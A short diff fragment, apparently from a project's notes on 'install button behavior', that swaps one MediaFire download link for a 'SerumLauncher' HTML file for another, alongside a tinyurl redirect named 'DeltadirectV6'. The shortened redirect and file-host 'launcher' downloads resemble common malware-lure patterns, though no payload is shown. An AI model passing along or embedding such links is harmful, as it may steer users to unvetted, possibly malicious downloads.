@@ -6,6 +6,5 @@ Install button behavior:
 - Redirects to https://tinyurl.com/DeltadirectV6
 
 
+https://www.mediafire.com/file/yul9kovlofr1fui/SerumLauncher-kahoot-updated.html/file
 
-
-https://www.mediafire.com/file/8grer915ou0njz5/SerumLauncher-lumina-v1.html/file
